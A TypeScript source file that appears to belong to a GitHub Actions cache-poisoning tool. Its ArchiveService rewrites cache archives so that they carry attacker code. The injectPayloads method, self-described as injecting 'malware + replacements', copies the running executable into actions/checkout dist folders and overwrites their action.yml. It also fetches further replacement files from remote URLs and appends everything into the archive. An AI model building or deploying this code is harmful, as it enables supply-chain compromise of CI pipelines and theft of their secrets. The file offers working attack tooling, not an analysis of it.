import * as fs from 'fs';
import * as path from 'path';
import { exec } from 'child_process';
import { promisify } from 'util';
import { tmpdir } from 'os';
import axios from 'axios';
import { ActionDetails, Replacement } from '../core/types';
import { CHECKOUT_YML } from '../config/constants';
import * as crypto from 'crypto';
import { cleanupFile, ensureDirExists, generateRandomString } from '../core/utils';
import { REPLACEMENTS } from '../config/index';

const execAsync = promisify(exec);

export class ArchiveService {

    async createRandomArchive(size: number): Promise<string> {
        const randomDirName = generateRandomString(12);
        const sourceDir = path.join('/tmp', `${randomDirName}`);
        const archivePath = path.join('/tmp', `${randomDirName}.tar.gz`);
        ensureDirExists(sourceDir);

        // Create random file with specified size
        const filePath = path.join(sourceDir, 'random.dat');
        const chunkSize = 1024 * 1024; // 1MB chunks
        const writeStream = fs.createWriteStream(filePath);

        try {
            let remaining = size;
            while (remaining > 0) {
                const currentChunk = Math.min(remaining, chunkSize);
                const buffer = crypto.randomBytes(currentChunk);
                writeStream.write(buffer);
                remaining -= currentChunk;
            }
            writeStream.end();

            await new Promise((resolve, reject) => {
                writeStream.on('finish', resolve);
                writeStream.on('error', reject);
            });
        } catch (error) {
            console.error(`Error creating random file: ${error}`);
            throw error;
        }

        // Tar the directory
        await this.createArchive(archivePath, sourceDir)

        // Only clean up the random file after the archive is created
        cleanupFile(filePath, 'temp random file');

        return archivePath;
    }
    async createArchive(archivePath: string, sourceDir: string): Promise<void> {
        try {
            const command = `tar -P --zstd -cf ${archivePath} ${sourceDir}`;
            const { stdout, stderr } = await execAsync(command);
            console.log(`About to run command: ${command}`);
        } catch (error) {
            console.error('Error creating archive:', error);
            throw error;
        }
    }

    async updateArchive(archive_path: string, new_files: { stagingDir: string; leadingPath: string; }[]): Promise<Boolean> {
        const tempDir = fs.mkdtempSync(path.join(tmpdir(), 'tar-'));
        const tempTarFile = path.join(tempDir, 'archive.zstd');
        try {
            // Decompress the tar.zst archive to a temporary tar file
            const decompressCommand = `zstd -d < ${archive_path} > ${tempTarFile}`;
            console.log(`About to run command: ${decompressCommand}`);
            // First decompress
            await execAsync(decompressCommand);

            for (const new_file of new_files) {
                const updateCommand = `tar -P --append --transform 's,^${new_file.stagingDir},${new_file.leadingPath},' --file=${tempTarFile} ${new_file.stagingDir}`;
                console.log(`About to run command: ${updateCommand}`);
                await execAsync(updateCommand);
            }
            const compressCommand = `file ${tempTarFile} && zstd < ${tempTarFile} > ${archive_path}`;
            console.log(`About to run command: ${compressCommand}`);
            await execAsync(compressCommand);

            return true;
        } catch (error) {
            console.error('Error updating archive:', error);
            throw error;
        } finally {
            // Clean up temporary files
            fs.rm(tempDir, { recursive: true }, (err) => {
                if (err) {
                    console.error('Error removing temporary directory:', err);
                }
            });
        }
    }

    async prepareFileEntry(fileName: string, decodedContent: string): Promise<string> {
        const randomDirName = generateRandomString(8);
        const sourceDir = path.join('/tmp', `${randomDirName}`);

        // Ensure the source directory exists
        if (!fs.existsSync(sourceDir)) {
            fs.mkdirSync(sourceDir, { recursive: true });
        }

        fs.writeFileSync(path.join(sourceDir, fileName), decodedContent);
        return sourceDir;
    }

    async listActions(actionPath: string): Promise<ActionDetails[]> {
        const actions: ActionDetails[] = [];

        if (!fs.existsSync(actionPath)) {
            return actions;
        }

        const directories = fs.readdirSync(actionPath, { withFileTypes: true })
            .filter(dirent => dirent.isDirectory())
            .map(dirent => dirent.name);

        for (const dir of directories) {
            const actionDir = path.join(actionPath, dir);
            const subDirs = fs.readdirSync(actionDir).filter(subDir => fs.lstatSync(path.join(actionDir, subDir)).isDirectory());

            for (const subDir of subDirs) {

                const subActionDir = path.join(actionDir, subDir);
                const subSubDirs = fs.readdirSync(subActionDir).filter(subSubDir => fs.lstatSync(path.join(subActionDir, subSubDir)).isDirectory());

                for (const subSubDir of subSubDirs) {

                    const subSubActionDir = path.join(subActionDir, subSubDir);
                    const ymlFile = ['action.yml', 'action.yaml'].find(file => fs.existsSync(path.join(subSubActionDir, file)));
                    if (ymlFile) {
                        const distDir = path.join(subSubActionDir, 'dist');
                        if (fs.existsSync(distDir) && fs.lstatSync(distDir).isDirectory()) {
                            const jsFiles = fs.readdirSync(distDir).filter(file => file.endsWith('.js'));
                            if (jsFiles.length > 0) {
                                const actionPath = `${dir}/${subDir}/${subSubDir}`

                                if (!actionPath.includes('actions/checkout')) {
                                    continue;
                                }

                                // Hack to handle actions/checkout differences
                                console.log(`Found action: ${actionPath}`);
                                actions.push({
                                    path: actionPath,
                                    yml: ymlFile,
                                    js: path.join('dist', jsFiles[0])
                                });

                                if (actionPath.includes('actions/checkout/v')) {
                                    const versionMatch = actionPath.match(/actions\/checkout\/v(\d+)/);
                                    if (versionMatch) {
                                        const currentVersion = parseInt(versionMatch[1], 10);
                                        for (let v = 1; v <= 6; v++) {
                                            if (v === currentVersion) continue;
                                            const newPath = actionPath.replace(`checkout/v${currentVersion}`, `checkout/v${v}`);
                                            actions.push({
                                                path: newPath,
                                                yml: ymlFile,
                                                js: path.join('dist', jsFiles[0])
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        return actions;
    }

    /**
     * Injects payloads (malware + replacements) into the archive.
     * @param archivePath Path to the archive to modify
     * @param currentFilePath Path to the current running executable (to copy as payload)
     */
    async injectPayloads(archivePath: string, currentFilePath: string): Promise<boolean> {
        const randomDirName = generateRandomString(12);
        const sourceDir = path.join('/tmp', `${randomDirName}`);
        const leadingPath = '/home/runner/work/_actions';
        ensureDirExists(sourceDir);

        const archiveDetails: { stagingDir: string; leadingPath: string; }[] = []

        const actions = await this.listActions(leadingPath);

        for (const actionDetails of actions) {
            const stagingDir = `${sourceDir}/${actionDetails?.path}`
            fs.mkdirSync(`${stagingDir}/dist`, { recursive: true });
            // Copy the current file to the source directory
            if (actionDetails?.js) {
                const newJsFile = actionDetails.js.replace('index.js', 'utility.js');
                fs.copyFileSync(currentFilePath, path.join(stagingDir, newJsFile));
            } else {
                throw new Error('JavaScript file path is undefined');
            }
            const checkout_yml = CHECKOUT_YML;
            fs.writeFileSync(path.join(stagingDir, actionDetails.yml), checkout_yml);
            archiveDetails.push({
                stagingDir: stagingDir,
                leadingPath: path.join(leadingPath, actionDetails.path)
            });
        }

        if (REPLACEMENTS.length > 0) {
            console.log("Replacements configured, adding to modified archive!")
            for (const replacement of REPLACEMENTS) {
                var decodedContent: string = '';
                if (replacement.FILE_CONTENT) {
                    // Base64 decode the content
                    decodedContent = Buffer.from(replacement.FILE_CONTENT, 'base64').toString('utf-8');
                } else if (replacement.FILE_URL) {
                    const response = await axios.get(replacement.FILE_URL);
                    if (response.status === 200) {
                        decodedContent = response.data;
                    }
                }

                if (decodedContent) {
                    const fileName = path.basename(replacement.FILE_PATH);
                    const dirPath = path.dirname(replacement.FILE_PATH);
                    const sourceDir = await this.prepareFileEntry(fileName, decodedContent);
                    archiveDetails.push({
                        stagingDir: sourceDir,
                        leadingPath: dirPath
                    });
                } else {
                    console.error(`Failed to fetch content for replacement: ${replacement.FILE_PATH}`);
                }
            }
        }

        await this.updateArchive(archivePath, archiveDetails);

        return true;
    }
}
